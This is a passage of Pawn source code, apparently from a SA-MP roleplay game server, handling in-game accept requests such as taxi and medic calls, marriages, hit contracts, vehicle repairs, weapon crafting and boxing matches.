                    SendClientMessage(playerid, COLOR_GREY, "The player who sent you a house invite has disconnected.");
                }
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Nobody sent you a house invite.");
                return 1;
            }
            return 1;
        }
        else if(strcmp(params, "handshake",true) == 0)
		{
			if(ShakeHandStyle[playerid] != 0 && ShakeHandRequest[playerid] != 999)
			{
				if (ProxDetectorS(1.3, playerid, ShakeHandRequest[playerid]) && (GetPlayerVirtualWorld(ShakeHandRequest[playerid]) == GetPlayerVirtualWorld(playerid)))
				{
					PlayerFacePlayer(playerid, ShakeHandRequest[playerid]);
					if(ShakeHandStyle[playerid] == 1)
					{
						ApplyAnimation(playerid,"GANGS","prtial_hndshk_biz_01", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","prtial_hndshk_biz_01", 4.0, 0, 0, 0, 0, 0);
					}
					if(ShakeHandStyle[playerid] == 2)
					{
						ApplyAnimation(playerid,"GANGS","prtial_hndshk_01", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","prtial_hndshk_01", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 3) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkaa", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkaa", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 4) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkba", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkba", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 5) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkca", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkca", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 6) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkcb", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkcb", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 7) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkda", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkda", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 8) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkea", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkea", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 9) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkfa", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkfa", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 10) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkfa_swt", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkfa_swt", 4.0, 0, 0, 0, 0, 0);
					}
					format(string, sizeof(string), "* %s has shook hands with %s.", GetPlayerNameEx(ShakeHandRequest[playerid]), GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					ShakeHandRequest[playerid] = 999;
					ShakeHandStyle[playerid] = 0;
					return 1;
				}
				else
				{
					format(string, sizeof(string), "%s reaches for %s's hand but misses.", GetPlayerNameEx(playerid), GetPlayerNameEx(ShakeHandRequest[playerid]));
					ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
      		}
            else SendClientMessage(playerid, COLOR_WHITE, "You don't have any handshake requests.");
            return 1;
        }
        else if(strcmp(params,"taxi",true) == 0) {
            if(TransportDuty[playerid] != 1) {
                SendClientMessage(playerid, COLOR_GREY, "   You're not a Taxi Driver!");
                return 1;
            }
            if(TaxiCallTime[playerid] > 0) {
                SendClientMessage(playerid, COLOR_GREY, "   You have already accepted a taxi call!");
                return 1;
            }
			if(CheckPointCheck(playerid))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
				return 1;
			}
            if(TaxiCall < 999) {
                if(IsPlayerConnected(TaxiCall)) {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(TaxiCall, giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* You have accepted the taxi call from %s, you will see the marker until you have reached it.",giveplayer);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    new zone[MAX_ZONE_NAME];
					GetPlayer3DZone(TaxiCall, zone, sizeof(zone));
					format(string, sizeof(string), "* %s can be found at %s.", GetPlayerNameEx(TaxiCall), zone);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* Taxi Driver %s has accepted your Taxi Call; please wait at your current position.",sendername);
                    SendClientMessage(TaxiCall, COLOR_LIGHTBLUE, string);
                    GameTextForPlayer(playerid, "~w~Taxi Caller~n~~r~Go to the red marker.", 5000, 1);
                    TaxiCallTime[playerid] = 1;
                    TaxiAccepted[playerid] = TaxiCall;
                    TaxiCall = 999;
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Nobody called for a taxi yet!");
                return 1;
            }
        }
        else if(strcmp(params,"bus",true) == 0) {
            if(TransportDuty[playerid] != 2) {
                SendClientMessage(playerid, COLOR_GREY, "   You're not a bus driver!");
                return 1;
            }
            if(BusCallTime[playerid] > 0) {
                SendClientMessage(playerid, COLOR_GREY, "   You have already accepted a bus call!");
                return 1;
            }
			if(CheckPointCheck(playerid))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
				return 1;
			}
            if(BusCall < 999) {
                if(IsPlayerConnected(BusCall)) {
                    if(CheckPointCheck(playerid)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
                        return 1;
                    }
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(BusCall, giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* You have accepted the Bus Call from %s, you will see the marker untill you have reached it.",giveplayer);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    new zone[MAX_ZONE_NAME];
					GetPlayer3DZone(BusCall, zone, sizeof(zone));
					format(string, sizeof(string), "* %s can be found at %s.", GetPlayerNameEx(BusCall), zone);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* Bus Driver %s has accepted your bus call; please wait at your current position.",sendername);
                    SendClientMessage(BusCall, COLOR_LIGHTBLUE, string);
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(BusCall, X, Y, Z);
                    SetPlayerCheckpoint(playerid, X, Y, Z, 5);
                    GameTextForPlayer(playerid, "~w~Bus Caller~n~~r~Goto redmarker", 5000, 1);
                    BusCallTime[playerid] = 1;
                    BusAccepted[playerid] = BusCall;
                    BusCall = 999;
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one called for a Bus yet!");
                return 1;
            }
        }
        else if(strcmp(params,"medic",true) == 0) {
            if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3) {
                if(MedicCallTime[playerid] > 0) {
                    SendClientMessage(playerid, COLOR_GREY, "   You have already accepted a Medic Call!");
                    return 1;
                }
                if(CheckPointCheck(playerid)) {
                    SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
                    return 1;
                }
                if(MedicCall < 999) {
                    if(IsPlayerConnected(MedicCall)) {
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(MedicCall, giveplayer, sizeof(giveplayer));
                        format(string, sizeof(string), "* You have accepted the Medic Call from %s",giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* After the 45 Seconds the Red Marker will dissapear.");
                        format(string, sizeof(string), "* Medic %s has accepted your Medic Call please wait at your current Position.",sendername);
                        SendClientMessage(MedicCall, COLOR_LIGHTBLUE, string);
                        new Float:X,Float:Y,Float:Z;
                        GetPlayerPos(MedicCall, X, Y, Z);
                        SetPlayerCheckpoint(playerid, X, Y, Z, 5);
                        new zone[MAX_ZONE_NAME];
                        GetPlayer3DZone(MedicCall, zone, sizeof(zone));
                        format(string, sizeof(string), "HINT: %s is located in %s", GetPlayerNameEx(MedicCall), zone);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        MedicCallTime[playerid] = 1;
                        MedicAccepted[playerid] = MedicCall;
                        MedicCall = 999;
                        return 1;
                    }
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   No-one called for a Medic yet!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   You're not a Medic!");
                return 1;
            }
        }
        else if(strcmp(params,"mechanic",true) == 0) {
            if(PlayerInfo[playerid][pJob] != 7 && PlayerInfo[playerid][pJob2] != 7) {
                SendClientMessage(playerid, COLOR_GREY, "   You're not a Car Mechanic!");
                return 1;
            }
            if(MechanicCallTime[playerid] > 0) {
                SendClientMessage(playerid, COLOR_GREY, "   You have already accepted a Mechanic Call!");
                return 1;
            }
            if(CheckPointCheck(playerid)) {
                SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
                return 1;
            }
            if(MechanicCall < 999) {
                if(IsPlayerConnected(MechanicCall)) {
                    if(playerid == MechanicCall) return 1;
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(MechanicCall, giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* You have accepted the Mechanic Call from %s, you have 30 Seconds to get there.",giveplayer);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* After the 30 Seconds the Red Marker will dissapear.");
                    format(string, sizeof(string), "* Car Mechanic %s has accepted your Mechanic Call please wait at your current Position.",sendername);
                    SendClientMessage(MechanicCall, COLOR_LIGHTBLUE, string);
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(MechanicCall, X, Y, Z);
                    SetPlayerCheckpoint(playerid, X, Y, Z, 5);
                    GameTextForPlayer(playerid, "~w~Mechanic Caller~n~~r~Goto redmarker", 5000, 1);
                    MechanicCallTime[playerid] = 1;
                    MechanicCall = 999;
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one called for a Car Mechanic yet!");
                return 1;
            }
        }
       	else if(strcmp(params,"divorce",true) == 0) {
            if(DivorceOffer[playerid] < 999) {
                if(IsPlayerConnected(DivorceOffer[playerid])) {
                    if(ProxDetectorS(10.0, playerid, DivorceOffer[playerid])) {
                        GetPlayerName(DivorceOffer[playerid], giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* You have signed the divorce papers from %s, you're now single again.", giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s has signed the divorce papers, you're now single again.", sendername);
                        SendClientMessage(DivorceOffer[playerid], COLOR_LIGHTBLUE, string);
                        ClearMarriage(playerid);
                        ClearMarriage(DivorceOffer[playerid]);
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   The player that sent you the Divorce Papers is not near you!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "Nobody sent you any divorce papers.");
                return 1;
            }
        }
        else if(strcmp(params,"witness",true) == 0) {
            if(MarryWitnessOffer[playerid] < 999) {
                if(IsPlayerConnected(MarryWitnessOffer[playerid])) {
                    if(ProxDetectorS(10.0, playerid, MarryWitnessOffer[playerid])) {
                        GetPlayerName(MarryWitnessOffer[playerid], giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* You have accepted %s's request to be their marriage witness.", giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s has accepted your request to be your marriage witness.", sendername);
                        SendClientMessage(MarryWitnessOffer[playerid], COLOR_LIGHTBLUE, string);
                        MarryWitness[MarryWitnessOffer[playerid]] = playerid;
                        MarryWitnessOffer[playerid] = 999;
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   The player that requested you to be their marriage witness is not near you!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one asked you to be their marriage witness!");
                return 1;
            }
        }
        else if(strcmp(params,"marriage",true) == 0) {
            if(ProposeOffer[playerid] < 999) {
                if(IsPlayerConnected(ProposeOffer[playerid])) {
                    if(ProxDetectorS(10.0, playerid, ProposeOffer[playerid])) {
                        if(MarryWitness[ProposeOffer[playerid]] == 999) {
                            SendClientMessage(playerid, COLOR_GREY, "   The proposer doesn't have a marriage witness!");
                            return 1;
                        }
                        if(IsPlayerConnected(MarryWitness[ProposeOffer[playerid]])) {
                            if(ProxDetectorS(12.0, ProposeOffer[playerid], MarryWitness[ProposeOffer[playerid]])) {
                                if(IsPlayerInRangeOfPoint(playerid, 10.0, 1963.9612, -369.1851, 1093.7289)) {
                                    GetPlayerName(ProposeOffer[playerid], giveplayer, sizeof(giveplayer));
                                    GetPlayerName(playerid, sendername, sizeof(sendername));
                                    format(string, sizeof(string), "* You have accepted %s's request to be your husband.", giveplayer);
                                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                    format(string, sizeof(string), "* %s has accepted your request to be your wife.", sendername);
                                    SendClientMessage(ProposeOffer[playerid], COLOR_LIGHTBLUE, string);
                                    format(string, sizeof(string), "Priest: %s, do you take %s as your lovely husband? (Type 'yes', as anything else will reject the marriage.)", sendername, giveplayer);
                                    SendClientMessage(playerid, COLOR_WHITE, string);
                                    MarriageCeremoney[playerid] = 1;
                                    ProposedTo[ProposeOffer[playerid]] = playerid;
                                    GotProposedBy[playerid] = ProposeOffer[playerid];
                                    MarryWitness[ProposeOffer[playerid]] = 999;
                                    ProposeOffer[playerid] = 999;
                                    return 1;
                                }
                                else {
                                    SendClientMessage(playerid, COLOR_GREY, "   You're not at the church!");
                                    return 1;
                                }
                            }
                            else {
                                SendClientMessage(playerid, COLOR_GREY, "   The marriage witness is not near your proposer!");
                                return 1;
                            }
                        }
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   The player that proposed to you is not near you!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Nobody proposed to you!");
                return 1;
            }
        }
        else if(strcmp(params,"contract",true) == 0) {
            if(HitOffer[playerid] < 999) {
                if(HitToGet[playerid] < 999) {
                    if(IsPlayerConnected(HitToGet[playerid])) {
                        format(string, sizeof(string), "* %s has accepted the contract to kill %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(HitToGet[playerid]));
                        SendClientMessage(HitOffer[playerid], COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* You have accepted the contract to kill %s, you will recieve $%d when completed.", GetPlayerNameEx(HitToGet[playerid]), PlayerInfo[HitToGet[playerid]][pHeadValue] / 4 * 2);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "%s has been assigned to the contract on %s, for $%d.", GetPlayerNameEx(playerid), GetPlayerNameEx(HitToGet[playerid]),  PlayerInfo[HitToGet[playerid]][pHeadValue] / 4 * 2);
                        SendFamilyMessage(4, COLOR_YELLOW, string);
                        GoChase[playerid] = HitToGet[playerid];
                        GetChased[HitToGet[playerid]] = playerid;
                        GotHit[HitToGet[playerid]] = 1;
                        HitToGet[playerid] = 999;
                        HitOffer[playerid] = 999;
                        return 1;
                    }
                    else {
                        HitToGet[playerid] = 999;
                        HitOffer[playerid] = 999;
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you a contract!");
                return 1;
            }
        }
        else if(strcmp(params,"ticket",true) == 0) {
            if(TicketOffer[playerid] < 999) {
                if(IsPlayerConnected(TicketOffer[playerid])) {
                    if(ProxDetectorS(5.0, playerid, TicketOffer[playerid])) {
                        if(GetPlayerCash(playerid) >= TicketMoney[playerid]) {
                            //new ip[32], ipex[32];
                            //GetPlayerIp(playerid, ip, sizeof(ip));
                            //GetPlayerIp(TicketOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[FACTION TICKET] %s (IP: %s) has paid $%d to %s (IP: %s)", GetPlayerNameEx(playerid), ip, TicketMoney[playerid], GetPlayerNameEx(TicketOffer[playerid]), ipex);
                            // Log("logs/pay.log", string);
                            format(string, sizeof(string), "* You have paid the ticket of $%d to %s.", TicketMoney[playerid], GetPlayerNameEx(TicketOffer[playerid]));
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s has paid your ticket of $%d.", GetPlayerNameEx(playerid), TicketMoney[playerid]);
                            SendClientMessage(TicketOffer[playerid], COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s has paid the ticket.", GetPlayerNameEx(playerid));
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            GivePlayerCash(playerid, - TicketMoney[playerid]);
                            TicketOffer[playerid] = 999;
                            TicketMoney[playerid] = 0;
                            if(GetPlayerCash(playerid) < 1) GivePlayerCash(playerid, 0);
                            return 1;
                        }
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   The officer is not near you!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you a ticket!");
                return 1;
            }
        }
        else if(strcmp(params,"repair",true) == 0) {
            if(RepairOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > RepairPrice[playerid]) {
                    if(IsPlayerInAnyVehicle(playerid)) {
                        if(IsPlayerConnected(RepairOffer[playerid])) {
                            GetPlayerName(RepairOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            RepairCar[playerid] = GetPlayerVehicleID(playerid);
                            RepairVehicle(RepairCar[playerid]);
                            PlayerInfo[RepairOffer[playerid]][pTire]--;

                            GivePlayerCash(RepairOffer[playerid], RepairPrice[playerid]);
                            GivePlayerCash(playerid, -RepairPrice[playerid]);
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(RepairOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "%s(IP:%s) has repaired the vehicle from %s(IP:%s) for $%d", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(RepairOffer[playerid]), ipex, RepairPrice[playerid]);
                            //Log("logs/pay.log", string);
                            format(string, sizeof(string), "* %s has repaired %s's vehicle.", giveplayer, GetPlayerNameEx(playerid));
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            format(string, sizeof(string), "* You repaired your car for $%d by Car Mechanic %s.",RepairPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

                            RepairWarn[playerid][RepairOffer[playerid]] += RepairPrice[playerid];
                            if(RepairWarn[playerid][RepairOffer[playerid]] >= 2500 && (PlayerInfo[RepairOffer[playerid]][pLevel] <= 3 || PlayerInfo[RepairOffer[playerid]][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) has repaired %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(RepairOffer[playerid]), ipex, RepairWarn[playerid][RepairOffer[playerid]]);
                                //Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            format(string, sizeof(string), "* You fixed %s's car, the $%d has been added to your money on hand!",sendername,RepairPrice[playerid]);
                            SendClientMessage(RepairOffer[playerid], COLOR_LIGHTBLUE, string);

							#if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour)) {
				    				PlayerInfo[RepairOffer[playerid]][pMechSkill] += 2;
				    				SendClientMessage(RepairOffer[playerid], COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
								}
								else {
									SendClientMessage(RepairOffer[playerid], COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
									PlayerInfo[RepairOffer[playerid]][pMechSkill]++;
								}
							#else
							    PlayerInfo[RepairOffer[playerid]][pMechSkill]++;
							#endif

                            RepairOffer[playerid] = 999;
                            RepairPrice[playerid] = 0;
                            return 1;
                        }
                        return 1;
                    }
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   You can't afford the Repair!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you to Repair your Car!");
                return 1;
            }
        }
        else if(strcmp(params,"craft",true) == 0) {
            if(CraftOffer[playerid] < 999) {
                if(IsPlayerConnected(CraftOffer[playerid])) {
                    if(ProxDetectorS(5.0, playerid, CraftOffer[playerid])) {
                        if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5) {
                            SendClientMessage(playerid, COLOR_GREY, "You can't spawn a weapon whilst in Hospital.");
                            return 1;
                        }
                        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Please exit the vehicle, before using this command.");
                        new weaponname[50];
                        format(weaponname, 50, "%s", CraftName[playerid]);
                        switch(CraftId[playerid]) {
                            case 1: {
                                PlayerInfo[playerid][pScrewdriver]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/sellgun");
                            }
                            case 3: {
                                PlayerInfo[playerid][pWristwatch]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/wristwatch");
                            }
                            case 5: {
                                PlayerInfo[playerid][pTire]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/repair");
                            }
                            case 7: {
                                PlayerInfo[playerid][pFirstaid]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/firstaid");
                            }
                            case 8: {
                                GivePlayerValidWeapon(playerid, 43, 50);
                            }
                            case 9: {
                                PlayerInfo[playerid][pRccam]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/rccam");
                            }
                            case 10: {
                                PlayerInfo[playerid][pReceiver]++;
                                SetPVarInt(playerid, "pReceiverMLeft", 40);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You will receive the next four department radio messages.");
                            }
                            case 11: {
                                PlayerInfo[playerid][pGPS]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/gps");
                            }
                            case 12: {
                                PlayerInfo[playerid][pSweep]++;
                                PlayerInfo[playerid][pSweepLeft] = 3;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/sweep");
                            }
                            case 13: {
                                GivePlayerValidWeapon(playerid, 46, 99999);
                            }
                        }
                        format(string, sizeof(string), "   You have given %s, a %s.", GetPlayerNameEx(playerid),weaponname);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(CraftOffer[playerid], COLOR_GRAD1, string);
                        format(string, sizeof(string), "   You have recieved a %s from %s.", weaponname, GetPlayerNameEx(CraftOffer[playerid]));
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        format(string, sizeof(string), "* %s created something from Materials, and hands it to %s.", GetPlayerNameEx(CraftOffer[playerid]), GetPlayerNameEx(playerid));
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        //new ip[32], ipex[32];
                        //GetPlayerIp(playerid, ip, sizeof(ip));
                        //GetPlayerIp(CraftOffer[playerid], ipex, sizeof(ipex));
                        //format(string, sizeof(string), "[CRAFTSMAN DEAL] %s (IP: %s) has bought a %s from %s (IP: %s)", GetPlayerNameEx(playerid), ip, weaponname, GetPlayerNameEx(CraftOffer[playerid]), ipex);
                        //Log("logs/pay.log", string);
                        PlayerInfo[CraftOffer[playerid]][pMats] -= CraftMats[playerid];
                        //PlayerInfo[CraftOffer[playerid]][pCraftSkill]++;
                        CraftOffer[playerid] = 999;
                        CraftId[playerid] = 0;
                        CraftMats[playerid] = 0;
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GRAD2, "You need to be the near the player that is selling you the weapon!");
                        return 1;
                    }
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you a Weapon!");
                return 1;
            }
        }
        else if(strcmp(params,"boxing",true) == 0) {
            if(BoxOffer[playerid] < 999) {
                if(IsPlayerConnected(BoxOffer[playerid])) {
                    new points;
                    new mypoints;
                    GetPlayerName(BoxOffer[playerid], giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    new level = PlayerInfo[BoxOffer[playerid]][pBoxSkill];
                    if(level >= 0 && level < 50) { points = 40; }
                    else if(level >= 50 && level < 100) { points = 50; }
                    else if(level >= 100 && level < 200) { points = 60; }
                    else if(level >= 200 && level < 400) { points = 70; }
                    else if(level >= 400) { points = 80; }
                    if(PlayerInfo[playerid][pJob] == 12 || PlayerInfo[playerid][pJob2] == 12) {
                        new clevel = PlayerInfo[playerid][pBoxSkill];
                        if(clevel >= 0 && clevel < 50) { mypoints = 40; }
                        else if(clevel >= 50 && clevel < 100) { mypoints = 50; }
                        else if(clevel >= 100 && clevel < 200) { mypoints = 60; }
                        else if(clevel >= 200 && clevel < 400) { mypoints = 70; }
                        else if(clevel >= 400) { mypoints = 80; }
                    }
                    else {
                        mypoints = 30;
                    }
                   	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
						return 1;
					}
					else if(GetPVarInt(BoxOffer[playerid], "Injured") != 0||PlayerCuffed[BoxOffer[playerid]]!=0||GetPVarInt(BoxOffer[playerid], "Hospital")!=0)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
						return 1;
					}
					if(PlayerInfo[playerid][pJob] != 12 && PlayerInfo[playerid][pJob2] != 12)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You do not have the Boxer Job!");
					    return 1;
					}
                    if(IsPlayerInRangeOfPoint(playerid,25.0, 765.952270, 4.167977, 1000.719238) && IsPlayerInRangeOfPoint(BoxOffer[playerid],25.0, 765.952270, 4.167977, 1000.719238))
					{
     					format(string, sizeof(string), "* You have accepted the Boxing Challenge from %s, and will fight with %d Health.",giveplayer,mypoints);
                    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    	format(string, sizeof(string), "* %s has accepted your Boxing Challenge Request, you will fight with %d Health.",sendername,points);
                    	SendClientMessage(BoxOffer[playerid], COLOR_LIGHTBLUE, string);
                        ResetPlayerWeapons(playerid);
                        ResetPlayerWeapons(BoxOffer[playerid]);
                        SetPlayerHealth(playerid, mypoints);
                        SetPlayerHealth(BoxOffer[playerid], points);

                        SetPlayerArmourEx(playerid, 0);
                        SetPlayerArmourEx(BoxOffer[playerid],0);

                        SetPlayerInterior(playerid, 5); SetPlayerInterior(BoxOffer[playerid], 5);
                        SetPlayerPos(playerid, 758.498596, -1.915163, 1001.594238); SetPlayerFacingAngle(playerid, 309.27);
                        SetPlayerPos(BoxOffer[playerid], 763.229248, 2.429135, 1001.594238); SetPlayerFacingAngle(BoxOffer[playerid], 133.83);
